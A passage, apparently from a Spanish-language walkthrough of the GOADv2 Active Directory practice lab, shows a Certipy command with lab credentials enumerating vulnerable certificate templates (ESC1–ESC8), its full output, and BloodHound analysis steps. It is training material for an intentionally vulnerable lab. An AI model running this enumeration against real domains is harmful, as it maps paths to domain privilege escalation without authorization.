+También es posible utilizar la bandera para mostrar las plantillas vulnerables. En ese caso, se puede ejecutar el comando: **`certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout`**
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 38 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 16 enabled certificate templates
+[*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
+[*] Got CA configuration for 'ESSOS-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : ESSOS-CA
+    DNS Name                            : braavos.essos.local
+    Certificate Subject                 : CN=ESSOS-CA, DC=essos, DC=local
+    Certificate Serial Number           : 3EFA9E269871C58549E2B860E39DD46B
+    Certificate Validity Start          : 2023-01-25 06:16:43+00:00
+    Certificate Validity End            : 2028-01-25 06:26:42+00:00
+    Web Enrollment                      : Enabled
+    User Specified SAN                  : Enabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : ESSOS.LOCAL\Administrators
+      Access Rights
+        ManageCertificates              : ESSOS.LOCAL\Administrators
+                                          ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Enterprise Admins
+        ManageCa                        : ESSOS.LOCAL\Administrators
+                                          ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Enterprise Admins
+        Enroll                          : ESSOS.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
+      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
+Certificate Templates
+  0
+    Template Name                       : ESC4
+    Display Name                        : ESC4
+    Certificate Authorities             : ESSOS-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireDirectoryPath
+                                          SubjectRequireEmail
+                                          SubjectAltRequireUpn
+    Enrollment Flag                     : AutoEnrollment
+                                          PublishToDs
+                                          PendAllRequests
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : 16777216
+                                          65536
+                                          ExportableKey
+    Extended Key Usage                  : Code Signing
+    Requires Manager Approval           : True
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 1
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : ESSOS.LOCAL\Domain Users
+      Object Control Permissions
+        Owner                           : ESSOS.LOCAL\Enterprise Admins
+        Full Control Principals         : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\khal.drogo
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\khal.drogo
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\khal.drogo
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Property Principals       : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\khal.drogo
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC4                              : 'ESSOS.LOCAL\\khal.drogo' has dangerous permissions
+  1
+    Template Name                       : ESC3-CRA
+    Display Name                        : ESC3-CRA
+    Certificate Authorities             : ESSOS-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+    Enrollment Flag                     : AutoEnrollment
+    Private Key Flag                    : 16777216
+                                          65536
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : ESSOS.LOCAL\Domain Users
+      Object Control Permissions
+        Owner                           : ESSOS.LOCAL\Enterprise Admins
+        Full Control Principals         : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Property Principals       : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
+  2
+    Template Name                       : ESC2
+    Display Name                        : ESC2
+    Certificate Authorities             : ESSOS-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : True
+    Any Purpose                         : True
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+    Enrollment Flag                     : AutoEnrollment
+    Private Key Flag                    : 16777216
+                                          65536
+    Extended Key Usage                  : Any Purpose
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : ESSOS.LOCAL\Domain Users
+      Object Control Permissions
+        Owner                           : ESSOS.LOCAL\Enterprise Admins
+        Full Control Principals         : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Property Principals       : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC2                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template can be used for any purpose
+      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
+  3
+    Template Name                       : ESC1
+    Display Name                        : ESC1
+    Certificate Authorities             : ESSOS-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Private Key Flag                    : 16777216
+                                          65536
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : ESSOS.LOCAL\Domain Users
+      Object Control Permissions
+        Owner                           : ESSOS.LOCAL\Enterprise Admins
+        Full Control Principals         : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Property Principals       : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC1                              : 'ESSOS.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+```
+
+Se puede observar información que indica que ESC1 y ESC2 son vulnerables, entre otros.
+
+![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%208.png)
+
+Siguiendo el proceso, se procede a cargar el archivo ZIP en BloodHound. Para llevar a cabo esta tarea, se debe utilizar una versión modificada de BloodHound proporcionada por ly4k **[ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases)** ly se inicia BloodHound de la misma manera que se hizo en sesiones anteriores. [**BloodHound**](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#bloodhound)
+
+Iniciando el proceso, se inicia el Neo4j, el cual debe ser una versión superior a 4.0.0. Posteriormente, BloodHound se inicia con el comando **`./BloodHound --no-sandbox`Una vez que BloodHound se inicia, se procede a cargar el archivo ZIP siguiendo el mismo procedimiento que se realizó en sesiones anteriores.** 
+
+![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%209.png)
+
+Una vez cargado, BloodHound mostrará estos archivos en la interfaz para su análisis y exploración. 
+
+![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%2010.png)
+
+Para continuar, se busca la opción "PKI" en la pestaña de Análisis y se hace clic en "Find Certificate Authorities".
+
+![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%2011.png)
+
+Luego, se selecciona la entrada relacionada con PKI y se cambia a la pestaña de Node Info. y se hace clic en "See Enabled Templates".
+
+![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%2012.png)
+
+---
